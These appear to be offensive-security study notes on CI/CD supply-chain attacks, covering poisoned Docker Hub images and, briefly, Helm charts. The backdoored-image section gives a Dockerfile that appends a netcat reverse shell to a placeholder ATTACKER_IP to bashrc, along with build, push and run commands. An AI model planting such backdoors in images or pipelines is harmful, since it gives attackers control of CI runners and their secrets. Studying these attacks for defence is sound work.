## Malicious Container Images in Pipelines (Public Docker Hub)
- Many CI/CD pipelines pull container images from public registries (like Docker Hub) for building, testing, and deploying applications
- If these images are not verified or pinned by digest, attackers can:
    - Upload malicious images with backdoors, cryptominers, or credential stealers
    - Replace legitimate images with poisoned ones (if the image name is reused or namespace isn’t protected)
    - Abuse popular image names (typosquatting or dependency confusion).

### Attack Path
- CI/CD pipeline uses an image like *node:latest* or *python:3.10* from Docker Hub
- Attacker uploads a malicious image with the same name under a similar namespace or replaces a previously benign image in a neglected repo
- Pipeline pulls the malicious image automatically
- During build/test, the image executes a hidden payload (e.g., reverse shell, credential exfiltration)
- Attacker gains control over the CI/CD runner or access to sensitive pipeline data (e.g., secrets, tokens, SSH keys)
- The malicious code may propagate further during application deployment

### Backdoored Docker Image
1. Create a malicious Dockerfile
```
RUN apt update && apt install -y netcat \ && echo 'nc -e /bin/sh ATTACKER_IP 4444' >> /etc/bash.bashrc

CMD ["bash"]
```
2. Build and Push the Malicious Image
```
docker build -t attacker/malicious-image . 
docker push attacker/malicious-image
```
If a CI/CD pipeline or developer pulls and runs this image, it gets compromised:
```
docker run -it attacker/malicious-image
```
Once executed, the reverse shell connects back to the attacker.

## Compromised Helm charts or manifests
What is Helm?
• Helm is the package manager for Kubernetes, often referred to as the "apt" or "yum" of the Kubernetes ecosystem
• Instead of manually applying dozens of YAML manifests, Helm lets you template, version, share, and deploy entire applications via what are called Helm Charts

How Helm Works
• A Helm Chart is a directory structure that contains:
	• Chart.yaml → metadata (name, version, etc.)
	• values.yaml → default configuration values
	• templates/ → the actual Kubernetes YAML files (templated)
• When you run:
```
helm install myapp ./my-chart
```
• It renders the templates using the values in values.yaml and applies the generated manifests to your Kubernetes cluster.

